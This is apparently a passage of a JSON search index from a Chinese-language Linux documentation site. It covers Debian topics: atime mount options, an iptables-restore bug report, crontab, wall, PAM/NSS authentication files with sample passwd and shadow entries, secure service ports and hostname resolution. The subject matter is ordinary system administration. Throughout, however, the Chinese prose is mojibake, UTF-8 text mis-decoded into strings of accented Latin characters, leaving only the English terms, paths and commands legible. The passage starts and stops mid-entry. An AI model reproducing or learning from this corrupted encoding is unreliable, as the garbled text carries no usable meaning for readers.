2.6.30 å¼€å§‹çš„é»˜è®¤è¡Œä¸º) å¦‚æœ GNU/Linux ç³»ç»Ÿçš„æ–‡ä»¶ç³»ç»Ÿä½¿ç”¨ \" noatime \" æŒ‚è½½ï¼Œåˆ™è¯»ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸ä¼šæ”¹å˜è¿™ä¸ªæ–‡ä»¶çš„ atime å±æ€§ã€‚ æ³¨è§£ ä¸ºäº†åœ¨æ­£å¸¸çš„ä½¿ç”¨åœºæ™¯ä¸­èƒ½å¤Ÿæå‡æ–‡ä»¶ç³»ç»Ÿçš„è¯»å–æ•ˆç‡ï¼Œ æ–°å¢äº† \" noatime \" å’Œ \" relatime \" è¿™ä¸¤ä¸ªåŠ è½½é€‰é¡¹ã€‚ å¦‚ä½¿ç”¨äº† \" strictatime \" é€‰é¡¹ï¼Œ å³ä½¿ç®€å•çš„æ–‡ä»¶è¯»æ“ä½œéƒ½ä¼´éšç€æ›´æ–° atime å±æ€§è¿™ä¸ªè€—æ—¶çš„å†™æ“ä½œã€‚ ä½†æ˜¯ atime å±æ€§é™¤äº† mbox æ–‡ä»¶ä»¥å¤–å´å¾ˆå°‘ç”¨åˆ°ã€‚ è¯¦æƒ…è¯·çœ‹ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/mount ã€‚ ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/touch å‘½ä»¤ä¿®æ”¹å·²å­˜åœ¨æ–‡ä»¶çš„æ—¶é—´æˆ³ã€‚","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Three-types-of-time-stamps.html","loc":"/yq-doc-source-docs-operating-system-linux-debian-DEBIAN-manual-Three-types-of-time-stamps.html"},{"title":"debian10 iptables-restore çš„ bug","text":"ç³»ç»Ÿæ˜¯åœ¨å®˜ç½‘ä¸‹è½½çš„åŒ…å®‰è£…çš„è™šæ‹Ÿæœº å†ä¸€æ¬¡ä¸šåŠ¡å¯¹æ¥è¿‡ç¨‹ä¸­æ„å¤–å‘ç°ä¸šåŠ¡è¿ä¸ä¸Šè¿™å°æœºå™¨ï¼Œ ç»è¿‡æ’é™¤å¤§æ³•ï¼Œ ç»ˆäºå‘ç°æ­¤ debian10 æœºå™¨çš„ iptables-restore æ¨¡å—å­˜åœ¨é—®é¢˜ åœ¨ debian9 çš„ç³»ç»Ÿä¸Šæµ‹è¯•æ— æ­¤é—®é¢˜ã€‚ åœ¨ç½‘ä¸Šä¹Ÿæ²¡æœ‰æ‰¾åˆ°ç›¸å…³çš„è®°å½• æœ¬æ¥æƒ³æäº¤ç»™ debian å®˜ç½‘ï¼Œå¥ˆä½•æ²¡æœ‰æ‰¾åˆ°å…¥å£ï¼Œé‚åœ¨æ­¤è®°å½•ã€‚ å½“ä½¿ç”¨ iptables-restore æ¢å¤é˜²ç«å¢™æ—¶ï¼Œä¼šæ¸…é™¤ -D è§„åˆ™ä¹‹å‰çš„æ‰€æœ‰é˜²ç«å¢™æ¡ç›® é—®é¢˜å›¾ï¼Œ-Då‰çš„è§„åˆ™è¢«åˆ é™¤ ç³»ç»Ÿé…ç½®å›¾ åœ¨ç¤¾åŒºä»¥åŠå®˜ç½‘æ‰¾äº†å¾ˆä¹…éƒ½æ²¡æœ‰æ‰¾åˆ°ç›¸å…³è¯´æ˜ å…ˆè®°å½•ä¸€ä¸‹","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Debian10-iptables-restore-bug.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Debian10-iptables-restore-bug.html"},{"title":"å®šæ—¶ä»»åŠ¡","text":"ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/crond æ¥è¿›è¡Œå®šæ—¶ä»»åŠ¡å®‰æ’ã€‚å‚è§ crontab å’Œ crontab ä½ èƒ½å¤Ÿä½œä¸ºä¸€ä¸ªæ™®é€šç”¨æˆ·å®šæ—¶è¿è¡Œä¸€ä¸ªè¿›ç¨‹ï¼Œæ¯”å¦‚ï¼Œ foo ä½¿ç”¨ crontab -e å‘½ä»¤åˆ›å»ºä¸€ä¸ª crontab æ–‡ä»¶ /var/spool/cron/crontabs/foo","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Timing-task.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Timing-task.html"},{"title":"è­¦å‘Šæ‰€æœ‰äºº","text":"ä½ å¯ä»¥é€šè¿‡ä¸‹é¢çš„æ–¹å¼ä½¿ç”¨ /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/wall ç»™ç™»å½•ç³»ç»Ÿçš„æ¯ä¸€ä¸ªäººå‘é€ä¿¡æ¯: $ echo \"We are shutting down in 1 hour\" | wall","tags":"æ“ä½œç³»ç»Ÿ","url":"/yq-doc-source-docs-operating-system-linux-question-Warning-everyone.html","loc":"/yq-doc-source-docs-operating-system-linux-question-Warning-everyone.html"},{"title":"è®¤è¯å’Œè®¿é—®æ§åˆ¶","text":"ä¸€èˆ¬çš„ Unix è®¤è¯ ä¸€èˆ¬çš„ Unix è®¤è¯ç”± PAM(Pluggable Authentication Modules,å³å¯æ’å…¥çš„éªŒè¯æ¨¡å—) ä¸‹çš„ pam_unix æ¨¡å—æä¾›ã€‚ å®ƒçš„ 3 ä¸ªé‡è¦æ–‡ä»¶å¦‚ä¸‹ï¼Œå…¶å†…çš„æ¡ç›®ä½¿ç”¨ \" : \" åˆ†éš”: æ–‡ä»¶ æƒé™ ç”¨æˆ· ç»„ è¯´æ˜ /etc/passwd -rw-r--r-- root root ï¼ˆæ˜æ–‡çš„ï¼‰ç”¨æˆ·è´¦å·ä¿¡æ¯ /etc/shadow -rw-r----- root shadow å®‰å…¨åŠ å¯†çš„ç”¨æˆ·è´¦å·ä¿¡æ¯ /etc/group -rw-r--r-- root root ç»„ä¿¡æ¯ /etc/passwd` /etc/passwd åŒ…å«ä¸‹åˆ—å†…å®¹: user1:x:1000:1000:User1 Name,,,:/home/user1:/bin/bash user2:x:1001:1001:User2 Name,,,:/home/user2:/bin/bash å¦‚ passwd ä¸­æ‰€è¿°ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸­è¢« \" : \" åˆ†éš”çš„æ¯é¡¹å«ä¹‰å¦‚ä¸‹ã€‚ ç™»å½•å å¯†ç å½¢å¼è¯´æ˜ æ•°å­—å½¢å¼çš„ç”¨æˆ· ID æ•°å­—å½¢å¼çš„ç»„ ID ç”¨æˆ·åæˆ–æ³¨é‡Šå­—æ®µ ç”¨æˆ·å®¶ç›®å½• å¯é€‰çš„ç”¨æˆ·å‘½ä»¤è§£é‡Šå™¨ /etc/passwd çš„ç¬¬äºŒé¡¹æ›¾ç»è¢«ç”¨æ¥ä¿å­˜åŠ å¯†åçš„å¯†ç ã€‚åœ¨å¼•å…¥äº† \" /etc/shadow \" åï¼Œè¯¥é¡¹è¢«ç”¨æ¥è¯´æ˜å¯†ç å½¢å¼ã€‚ /etc/shadow /etc/shadow åŒ…å«ä¸‹åˆ—å†…å®¹: user1:$1$Xop0FYH9$IfxyQwBe9b8tiyIkt2P4F/:13262:0:99999:7::: user2:$1$vXGZLVbS$ElyErNf/agUDsm1DehJMS/:13261:0:99999:7::: å¦‚ shadow (5) ä¸­æ‰€è¿°ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸­è¢« \" : \" åˆ†éš”çš„æ¯é¡¹å«ä¹‰å¦‚ä¸‹ã€‚ ç™»å½•å åŠ å¯†åçš„å¯†ç ï¼ˆå¼€å¤´çš„ \" $1$ \" è¡¨ç¤ºä½¿ç”¨ MD5 åŠ å¯†ã€‚\"*\" è¡¨ç¤ºæ— æ³•ç™»é™†ã€‚ï¼‰ æœ€åä¸€æ¬¡ä¿®æ”¹å¯†ç çš„æ—¶é—´ï¼Œå…¶è¡¨ç¤ºä» 1970 å¹´ 1 æœˆ 1 æ—¥èµ·çš„å¤©æ•° å…è®¸ç”¨æˆ·å†æ¬¡ä¿®æ”¹å¯†ç çš„å¤©æ•°é—´éš” ç”¨æˆ·å¿…é¡»ä¿®æ”¹å¯†ç çš„å¤©æ•°é—´éš”å¯†ç å¤±æ•ˆå‰çš„å¤©æ•°ï¼Œåœ¨æ­¤æœŸé—´ç”¨æˆ·ä¼šè¢«è­¦å‘Š å¯†ç å¤±æ•ˆåçš„å¤©æ•°ï¼Œåœ¨æ¬¡æœŸé—´å¯†ç ä¾æ—§ä¼šè¢«æ¥å—è´¦å·å¤±æ•ˆçš„æ—¶é—´ï¼Œå…¶è¡¨ç¤ºä» 1970 å¹´ 1 æœˆ 1 æ—¥èµ·çš„å¤©æ•° â€¦ /etc/group /etc/group åŒ…å«ä¸‹åˆ—å†…å®¹: group1:x:20:user1,user2 å¦‚ group (5) ä¸­æ‰€è¿°ï¼Œè¿™ä¸ªæ–‡ä»¶ä¸­è¢« \" : \" åˆ†éš”çš„æ¯é¡¹å«ä¹‰å¦‚ä¸‹ã€‚ ç»„åç§° åŠ å¯†åçš„å¯†ç ï¼ˆä¸ä¼šè¢«çœŸæ­£ä½¿ç”¨ï¼‰ æ•°å­—å½¢å¼çš„ç»„ ID ä½¿ç”¨ \",\" åˆ†éš”çš„ç”¨æˆ·ååˆ—è¡¨ æ³¨è§£ \" /etc/gshadow \" ä¸º \" /etc/group \" æä¾›äº†ä¸ \" /etc/shadow \" ç›¸ä¼¼çš„åŠŸèƒ½ï¼Œä½†æ²¡æœ‰è¢«çœŸæ­£åœ°ä½¿ç”¨ã€‚ å¦‚æœ\" auth optional pam_group.so \" è¿™è¡Œæ·»åŠ åˆ°äº†\" /etc/pam.d/common-auth \"ï¼Œ å¹¶ä¸”åœ¨\" /etc/security/group.conf \" é‡Œè¿›è¡Œäº†è®¾ç½®ï¼Œä¸€ä¸ªç”¨æˆ·çš„å®é™…ç»„å°±å¯ä»¥è¢«åŠ¨æ€æ·»åŠ ã€‚å‚è§ pam_group (8). base-passwd è½¯ä»¶åŒ…åŒ…å«äº†ä¸€ä»½ç”¨æˆ·å’Œç»„çš„å®˜æ–¹æ–‡æ¡£ï¼š\" /usr/share/doc/base-passwd/users-and-groups.html \"ã€‚ è®¾ç«‹åŠ å¯†çš„å¯†ç  ä¸‹é¢æ˜¯ä¸€äº›ç”¨äº ç”ŸæˆåŠ ç›çš„åŠ å¯†å¯†ç  çš„ç‹¬ç«‹å·¥å…· ç”Ÿæˆå¯†ç çš„å·¥å…·: è½¯ä»¶åŒ… æµè¡Œåº¦ å¤§å° å‘½ä»¤ åŠŸèƒ½ whois V:32, I:371 364 mkpasswd å…·å¤‡ crypt(3) åº“æ‰€æœ‰ç‰¹æ€§çš„å‰ç«¯ openssl V:814, I:994 1465 openssl passwd è®¡ç®—å¯†ç å“ˆå¸Œ (OpenSSL). passwd(1ssl) PAM å’Œ NSS å¯å‚è€ƒ: PAMæ¨¡å— ç°ä»£çš„ ç±» Unix ç³»ç»Ÿï¼ˆä¾‹å¦‚ Debian ç³»ç»Ÿï¼‰æä¾› PAM(Pluggable Authentication Modules,å³å¯æ’å…¥çš„éªŒè¯æ¨¡å—) å’Œ NSSï¼ˆName Service Switchï¼Œåç§°æœåŠ¡åˆ‡æ¢ï¼‰ æœºåˆ¶ç»™æœ¬åœ°ç³»ç»Ÿç®¡ç†å‘˜ï¼Œä½¿ä»–ä»¬èƒ½å¤Ÿé…ç½®è‡ªå·±çš„ç³»ç»Ÿã€‚å®ƒä»¬çš„åŠŸèƒ½å¯ä»¥æ¦‚æ‹¬ä¸ºä»¥ä¸‹å‡ ç‚¹ã€‚ PAM ç»™åº”ç”¨è½¯ä»¶æä¾›äº†ä¸€ä¸ªçµæ´»çš„è®¤è¯æœºåˆ¶ï¼Œå› æ­¤æ¶‰åŠåˆ°äº†å¯†ç æ•°æ®çš„äº¤æ¢ã€‚ NSS æä¾›äº†ä¸€ä¸ªçµæ´»çš„åç§°æœåŠ¡æœºåˆ¶ï¼Œ å®ƒç»å¸¸è¢« C æ ‡å‡†åº“ ä½¿ç”¨ï¼Œ ä½¿ä¾‹å¦‚ ls (1) å’Œ id (1) è¿™æ ·çš„ç¨‹åºè·å¾—ç”¨æˆ·å’Œç»„åç§°ã€‚ PAM å’Œ NSS ç³»ç»Ÿå¿…é¡»ä¿æŒé…ç½®ä¸€è‡´ã€‚ PAM å’Œ NSS ç³»ç»Ÿä¸­é‡è¦çš„è½¯ä»¶åŒ…å¦‚ä¸‹: è½¯ä»¶åŒ… æµè¡Œåº¦ å¤§å° è¯´æ˜ libpam-modules V:813, I:999 1048 æ’å…¥å¼éªŒè¯æ¨¡å—ï¼ˆåŸºç¡€æœåŠ¡ï¼‰ libpam-ldap I:12 249 å…è®¸ LDAP æ¥å£çš„æ’å…¥å¼éªŒè¯æ¨¡å— libpam-cracklib I:15 117 å¯ç”¨ cracklib æ”¯æŒçš„æ’å…¥å¼éªŒè¯æ¨¡å— libpam-systemd V:484, I:869 574 ç”¨äº logind æ³¨å†Œç”¨æˆ·ä¼šè¯çš„æ’å…¥å¼éªŒè¯æ¨¡å—ï¼ˆPAMï¼‰ libpam-doc I:1 1046 æ’å…¥å¼éªŒè¯æ¨¡å—ï¼ˆhtml å’Œ æ–‡æœ¬æ–‡æ¡£ï¼‰ libc6 V:946, I:999 12772 GNU C åº“ï¼šåŒæ ·æä¾›\"åç§°æœåŠ¡åˆ‡æ¢\"æœåŠ¡çš„å…±äº«åº“ glibc-doc I:11 3161 GNU C åº“ï¼šå¸®åŠ©é¡µé¢ glibc-doc-reference I:4 12740 GNU C åº“ï¼šå‚è€ƒæ‰‹å†Œï¼Œæœ‰ infoã€pdf å’Œ html æ ¼å¼ï¼ˆnon-freeï¼‰ libnss-mdns I:508 150 ç”¨äºè§£æç»„æ’­ DNS åç§°çš„ NSS æ¨¡å— libnss-ldap I:11 265 NSS æ¨¡å—ï¼Œç”¨äºä½¿ç”¨ LDAP ä½œä¸ºä¸€ä¸ªåç§°æœåŠ¡çš„ libnss-ldapd I:14 153 NSS æ¨¡å—ï¼Œç”¨äºä½¿ç”¨ LDAP ä½œä¸ºä¸€ä¸ªåç§°æœåŠ¡çš„ï¼ˆlibnss-ldap çš„æ–° forkï¼‰ libpam-doc ä¸­ \"The Linux-PAM System Administrators' Guide\" æ˜¯äº†è§£ PAM é…ç½®çš„å¿…è¦æ–‡æ¡£ã€‚ glibc-doc-reference ä¸­çš„ \"System Databases and Name Service Switch\" æ˜¯äº†è§£ NSS é…ç½®çš„é‡è¦æ–‡æ¡£ã€‚ æ³¨æ„ ä½ å¯ä»¥ä½¿ç”¨ \" aptitude search 'libpam-|libnss-' \" å‘½ä»¤æŸ¥çœ‹æ›´å¤šçš„ç›¸å…³è½¯ä»¶åŒ…ã€‚ NSS ç¼©å†™ä¹Ÿå¯èƒ½æ„å‘³ç€ \"Network Security Serviceï¼Œç½‘ç»œå®‰å…¨æœåŠ¡\"ï¼Œå®ƒä¸åŒäº \"Name Service Switchï¼Œåç§°æœåŠ¡åˆ‡æ¢\"ã€‚ PAM æ˜¯ç”¨æ¥ä¸ºæ¯ä¸ªç¨‹åºä½¿ç”¨ç³»ç»ŸèŒƒå›´çš„é»˜è®¤å€¼æ¥åˆå§‹åŒ–ç¯å¢ƒå˜é‡çš„æœ€åŸºç¡€æ–¹æ³•ã€‚ åœ¨ systemd ä¸‹, libpam-systemd è½¯ä»¶åŒ…è¢«å®‰è£…ç”¨æ¥ç®¡ç†ç”¨æˆ·ç™»å½•ï¼Œ é€šè¿‡ä¸º logind åœ¨ systemd æ§åˆ¶ç»„å±‚çº§ä¸­æ³¨å†Œç”¨æˆ·ä¼šè¯æ¥å®ç°ã€‚ PAM å’Œ NSS è®¿é—®çš„é…ç½®æ–‡ä»¶ ä¸‹é¢æ˜¯ä¸€äº› PAM å’Œ NSS è®¿é—®çš„é‡è¦é…ç½®æ–‡ä»¶: é…ç½®æ–‡ä»¶ åŠŸèƒ½ /etc/pam.d/program_name ä¸º \"program_name\" ç¨‹åºè®¾ç½® PAM é…ç½®ï¼›å‚åŠ  pam(7) å’Œ pam.d(5) /etc/nsswitch.conf ä¸ºæ¯ä¸ªæœåŠ¡æ¡ç›®è®¾ç½® NSS é…ç½®ã€‚å‚è§ nsswitch.conf(5) /etc/nologin é€šè¿‡ pam_nologin(8) æ¨¡å—é™åˆ¶ç”¨æˆ·ç™»é™† /etc/securetty é€šè¿‡ pam_securetty(8) æ¨¡å—é™åˆ¶ root è®¿é—® tty /etc/security/access.conf é€šè¿‡ pam_access(8) æ¨¡å—è®¾ç½®è®¿é—®é™åˆ¶ /etc/security/group.conf é€šè¿‡ pam_group(8) æ¨¡å—è®¾ç½®åŸºäºç»„çš„é™åˆ¶ /etc/security/pam_env.conf é€šè¿‡ pam_env(8) æ¨¡å—è®¾ç½®ç¯å¢ƒå˜é‡ /etc/environment é€šè¿‡å¸¦æœ‰ \"readenv=1\" å‚æ•°çš„ pam_env(8) æ¨¡å—è®¾ç½®é¢å¤–çš„ç¯å¢ƒå˜é‡ /etc/default/locale é€šè¿‡å¸¦æœ‰ \"readenv=1 envfile=/etc/default/locale\" å‚æ•°çš„ pam_env(8) æ¨¡å—è®¾ç½®è¯­è¨€ç¯å¢ƒå€¼ï¼ˆåœ¨ Debian ç³»ç»Ÿä¸­ï¼‰ /etc/security/limits.conf é€šè¿‡ pam_linits(8) æ¨¡å—è®¾ç½®èµ„æºé™åˆ¶ï¼ˆulimitã€core ç­‰ç­‰ï¼‰ /etc/security/time.conf é€šè¿‡ pam_time(8) æ¨¡å—è®¾ç½®æ—¶é—´é™åˆ¶ /etc/systemd/logind.conf è®¾ç½®systemd çš„ç™»å½•ç®¡ç†å™¨é…ç½® (å‚è§ logind.conf(5) å’Œ systemd-logind.service(8)) å¯†ç é€‰æ‹©çš„é™åˆ¶æ˜¯é€šè¿‡ PAM æ¨¡å— pam_unix (8) å’Œ pam_cracklib (8) æ¥å®ç°çš„ã€‚å®ƒä»¬å¯ä»¥é€šè¿‡å„è‡ªçš„å‚æ•°è¿›è¡Œé…ç½®ã€‚ æ³¨è§£ PAM æ¨¡å—åœ¨æ–‡ä»¶åä¸­ä½¿ç”¨åç¼€ \" .so \"ã€‚ ç°ä»£çš„é›†ä¸­å¼ç³»ç»Ÿç®¡ç† ç°ä»£çš„é›†ä¸­å¼ç³»ç»Ÿç®¡ç†å¯ä»¥ä½¿ç”¨é›†ä¸­å¼çš„ è½»é‡ç›®å½•è®¿é—®åè®®ï¼ˆLDAPï¼‰ æœåŠ¡å™¨è¿›è¡Œéƒ¨ç½²ï¼Œä»è€Œé€šè¿‡ç½‘ç»œç®¡ç†è®¸å¤šç±» Unix å’Œ éç±» Unix ç³»ç»Ÿã€‚ è½»é‡ç›®å½•è®¿é—®åè®®çš„å¼€æºå®ç°æ˜¯ OpenLDAP è½¯ä»¶ LDAP æœåŠ¡å™¨ä½¿ç”¨å¸¦æœ‰ PAM å’Œ NSS çš„ libpam-ldap å’Œ libnss-ldap è½¯ä»¶åŒ…ä¸º Debian ç³»ç»Ÿæä¾›è´¦å·ä¿¡æ¯ã€‚ éœ€è¦ä¸€äº›åŠ¨ä½œæ¥å¯ç”¨ LDAPï¼ˆæˆ‘æ²¡æœ‰ä½¿ç”¨è¿‡è¿™ä¸ªè®¾ç½®ï¼Œå¹¶ä¸”ä¸‹é¢çš„ä¿¡æ¯çº¯ç²¹æ˜¯ç¬¬äºŒæ‰‹çš„ä¿¡æ¯ã€‚è¯·åœ¨è¿™ç§å‰æä¸‹é˜…è¯»ä¸‹åˆ—å†…å®¹ã€‚ é€šè¿‡è¿è¡Œä¸€ä¸ªç¨‹åºï¼Œä¾‹å¦‚ç‹¬ç«‹çš„ LDAP å®ˆæŠ¤è¿›ç¨‹ slapd (8)ï¼Œæ¥å»ºç«‹é›†ä¸­å¼çš„ LDAP æœåŠ¡å™¨ã€‚ ä½ åœ¨ \" /etc/pam.d/ \" ç›®å½•ä¸­çš„ PAM é…ç½®æ–‡ä»¶é‡Œï¼Œä½¿ç”¨ \" pam_ldap.so \" æ›¿ä»£é»˜è®¤å€¼ \" pam_unix.so \"ã€‚ - Debian ä½¿ç”¨ \" /etc/pam_ldap.conf \" ä½œä¸º libpam-ldap çš„é…ç½®æ–‡ä»¶ï¼Œ\" /etc/pam_ldap.secret \" ä½œä¸ºä¿å­˜ root å¯†ç çš„æ–‡ä»¶ã€‚ ä½ åœ¨ \" /etc/nsswitch.conf \" æ–‡ä»¶ä¸­æ”¹å˜ NSS é…ç½®ï¼Œä½¿ç”¨ \" ldap \" æ›¿ä»£é»˜è®¤å€¼ï¼ˆ\" compat \" æˆ– \" file \"ï¼‰ã€‚ - Debian ä½¿ç”¨ \" /etc/libnss-ldap.conf \" ä½œä¸º libnss-ldap çš„é…ç½®æ–‡ä»¶ã€‚ ä¸ºäº†å¯†ç çš„å®‰å…¨ï¼Œä½ å¿…é¡»è®© libpam-ldap ä½¿ç”¨ SLLï¼ˆæˆ– TLSï¼‰ è¿æ¥ã€‚ ä¸ºäº†ç¡®ä¿ LDAP ç½‘ç»œå¼€é”€æ•°æ®çš„å®Œæ•´æ€§ï¼Œä½ å¿…é¡»è®© libpam-ldap ä½¿ç”¨ SLLï¼ˆæˆ– TLSï¼‰ è¿æ¥ã€‚ ä¸ºäº†å‡å°‘ LDAP ç½‘ç»œæµé‡ï¼Œä½ åº”è¯¥åœ¨æœ¬åœ°è¿è¡Œ nscd (8) æ¥ç¼“å­˜ä»»ä½• LDAP æœç´¢ç»“æœã€‚ ä¸ºä»€ä¹ˆ GNU su ä¸æ”¯æŒ wheel ç»„ è¿™æ˜¯åœ¨æ—§çš„ \" info su \" åº•éƒ¨ Richard M. Stallman æ‰€è¯´çš„ä¸€å¥åè¨€ã€‚ åˆ«æ‹…å¿ƒï¼šDebian ç³»ç»Ÿä¸­å½“å‰çš„ su å‘½ä»¤ä½¿ç”¨äº† PAMï¼Œ è¿™æ ·å½“åœ¨ \" /etc/pam.d/su \" ä¸­å¯ç”¨äº†å¸¦æœ‰ \" pam_wheel.so \" çš„è¡Œåï¼Œ å°±èƒ½å¤Ÿé™åˆ¶é wheel ç»„çš„ç”¨æˆ· su åˆ° root ç»„çš„èƒ½åŠ›ã€‚ ç¡®ä¿äº’è”ç½‘ä¸Šçš„çš„å¯†ç å®‰å…¨ è®¸å¤šæµè¡Œçš„ä¼ è¾“å±‚æœåŠ¡éƒ½ä½¿ç”¨çº¯æ–‡æœ¬æ¥ä¼ è¾“åŒ…æ‹¬å¯†ç éªŒè¯ä¿¡æ¯åœ¨å†…çš„å„ç±»æ¶ˆæ¯ã€‚ ä½¿ç”¨çº¯æ–‡æœ¬åœ¨å…¬ç½‘ä¸Šä¼ è¾“å¯†ç æ˜¯å¾ˆç³Ÿç³•çš„åšæ³•ï¼Œå› ä¸ºè¿™æ ·ä¼ è¾“çš„å¯†ç å¾ˆå®¹æ˜“åœ¨ç½‘ä¸Šè¢«ä»–äººæˆªè·ã€‚ ä¸ºäº†ç¡®ä¿æ•´ä¸ªæ²Ÿé€šè¿‡ç¨‹ï¼ŒåŒ…æ‹¬å¯†ç ä¿¡æ¯åœ¨å†…éƒ½ä½¿ç”¨åŠ å¯†ä¼ è¾“æ¥ç¡®ä¿å®‰å…¨ï¼Œ æ‚¨å¯ä»¥åœ¨ ä¼ è¾“å±‚å®‰å…¨ï¼ˆTransport Layer Securityï¼ŒTLSï¼‰ åè®®æˆ–è€…å…¶å‰èº«ï¼Œ\"å®‰å…¨å¥—æ¥å­—å±‚ï¼ˆSecure Sockets Layerï¼ŒSSLï¼‰\"åè®®ä¹‹ä¸Šè¿è¡Œè¿™äº›æœåŠ¡: ä¸å®‰å…¨çš„æœåŠ¡å ç«¯å£ å®‰å…¨çš„æœåŠ¡å ç«¯å£ www (http) 80 https 443 smtp (é‚®ä»¶) 25 ssmtp (smtps) 465 ftp-data 20 ftps-data 989 ftp 21 ftps 990 telnet 23 telnets 992 imap2 143 imaps 993 pop3 110 pop3s 995 ldap 389 ldaps 636 åŠ å¯†æ¶ˆè€— CPU æ—¶é—´ã€‚ ä½œä¸ºå¯¹ CPU æœ‰ç›Šçš„æ›¿ä»£æ–¹æ¡ˆï¼Œä½ å¯ä»¥ä¿æŒä½¿ç”¨çº¯æ–‡æœ¬é€šè®¯ï¼Œ ä»…ä»…ä½¿ç”¨å®‰å…¨è®¤è¯åè®®åŠ å¯†å¯†ç ï¼Œ æ¯”å¦‚è¯´ï¼šPOP ä½¿ç”¨\"Authenticated Post Office Protocol\" (APOP)ï¼Œ SMTP å’Œ IMAP ä½¿ç”¨ \"Challenge-Response Authentication Mechanism MD5\" (CRAM-MD5)ã€‚ ï¼ˆä½ çš„é‚®ä»¶å®¢æˆ·ç«¯é€šè¿‡äº’è”ç½‘ä¸Šä½ çš„é‚®ä»¶æœåŠ¡å™¨å‘é€é‚®ä»¶æ—¶ï¼Œ æœ€è¿‘æµè¡Œä½¿ç”¨æ–°çš„é€’äº¤ç«¯å£ 587 æ¥ä»£æ›¿ä¼ ç»Ÿçš„ SMTP ç«¯å£ 25ï¼Œ è¿™æ ·å¯ä»¥é¿å…åœ¨ä½¿ç”¨ CRAM-MD5 è®¤è¯è‡ªå·±æ—¶ï¼Œç½‘ç»œæä¾›å•†é˜»å¡ 25 ç«¯å£ã€‚ï¼‰ å®‰å…¨ Shell å®‰å…¨ Shell (SSH) ç¨‹åºä½¿ç”¨å®‰å…¨è®¤è¯æ¥æä¾›ä¸å®‰å…¨ç½‘ç»œä¸Šä¸¤ä¸ªä¸å¯ä¿¡ä»»ä¸»æœºä¹‹é—´çš„å®‰å…¨åŠ å¯†é€šè®¯ã€‚ å®ƒç”± OpenSSH å®¢æˆ·ç«¯, ssh (1), å’Œ OpenSSH åå°å®ˆæŠ¤è¿›ç¨‹ï¼ˆdaemonï¼‰, sshd (8)ç»„æˆ.SSH ä½¿ç”¨ç«¯å£è½¬å‘ç‰¹æ€§ï¼Œ å¯ä»¥ç»™ POP å’Œ X ä¹‹ç±»çš„ä¸å®‰å…¨çš„åè®®é€šè®¯å»ºç«‹éš§é“ï¼Œä½¿å…¶å¯ä»¥åœ¨äº’è”ç½‘ä¸Šå®‰å…¨ä¼ è¾“ã€‚ å®¢æˆ·ç«¯å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹å¼æ¥è®¤è¯è‡ªå·±ï¼š åŸºäºä¸»æœºçš„è®¤è¯ å…¬é’¥è®¤è¯ è´¨ç–‘åº”ç­”è®¤è¯ å¯†ç è®¤è¯ ä½¿ç”¨å…¬é’¥è®¤è¯ï¼Œå¯ä»¥å®ç°è¿œç¨‹å…å¯†ç ç™»å½•ã€‚ å‚è§ ç¬¬ 6.3 èŠ‚ \"æœåŠ¡å™¨è¿œç¨‹è®¿é—®å’Œå·¥å…· (SSH)\" root å¯†ç å®‰å…¨ ä¸ºé˜»æ­¢äººä»¬ä½¿ç”¨ root æƒé™è®¿é—®ä½ çš„æœºå™¨ï¼Œä½ éœ€è¦åšä¸‹é¢çš„æ“ä½œã€‚ é˜»æ­¢å¯¹ç¡¬ç›˜çš„ç‰©ç†è®¿é—® é”ä½ UEFI/ BIOS æ¥é˜»æ­¢ä»å¯ç§»åŠ¨ä»‹è´¨å¯åŠ¨ ä¸º GRUB äº¤äº’å¼ä¼šè¯è®¾ç½®å¯†ç  é”ä½ GRUB èœå•ï¼Œç¦æ­¢ç¼–è¾‘ sudo å‚è€ƒ: /docs/æ“ä½œç³»ç»Ÿ/linux/linuxæŒ‡ä»¤/sudo PolicyKit PolicyKit æ˜¯åœ¨ç±» Unix æ“ä½œç³»ç»Ÿä¸­æ§åˆ¶æ•´ä¸ªç³»ç»Ÿæƒé™çš„ä¸€ä¸ªæ“ä½œç³»ç»Ÿç»„ä»¶ã€‚ è¾ƒæ–°çš„ GUI å›¾å½¢ç•Œé¢ç¨‹åºè®¾è®¡æ—¶ä¾¿è€ƒè™‘åˆ°äº†ä¸ä½œä¸ºç‰¹æƒè¿›ç¨‹æ¥è¿è¡Œã€‚ å®ƒä»¬é€šè¿‡ PolicyKit æ¥å’Œç‰¹æƒè¿›ç¨‹é€šä¿¡ï¼Œä»è€Œæ‰§è¡Œç®¡ç†æ“ä½œã€‚ åœ¨ Debian ç³»ç»Ÿä¸­ï¼ŒPolicyKit é™åˆ¶äº†å±äº sudo ç»„çš„ç”¨æˆ·è´¦å·çš„è¿™ç§æ“ä½œã€‚ ç½‘ç»œè®¾ç½® ä¸»æœºåè§£æ ä¸»æœºåè§£æï¼Œç›®å‰ä¹Ÿæ˜¯ç”± NSS (åå­—æœåŠ¡è½¬æ¢ Name Service Switch) æœºåˆ¶æ¥æ”¯æŒã€‚è¿™ä¸ªè§£æçš„æµç¨‹å¦‚ä¸‹ /etc/nsswitch.conf æ–‡ä»¶é‡Œçš„ hosts: files dns è¿™æ®µè§„å®šä¸»æœºåè§£æé¡ºåºã€‚ (ä»£æ›¿ /etc/host.conf æ–‡ä»¶é‡Œçš„\" order è¿™æ®µåŸæœ‰çš„åŠŸèƒ½ã€‚) files æ–¹å¼é¦–å…ˆè¢«è°ƒç”¨ã€‚å¦‚æœä¸»æœºååœ¨ /etc/hosts æ–‡ä»¶é‡Œé¢å‘ç°ï¼Œ åˆ™è¿”å›æ‰€æœ‰æœ‰æ•ˆåœ°å€å¹¶é€€å‡ºã€‚ ( /etc/host.conf æ–‡ä»¶åŒ…å« multi on .) dns 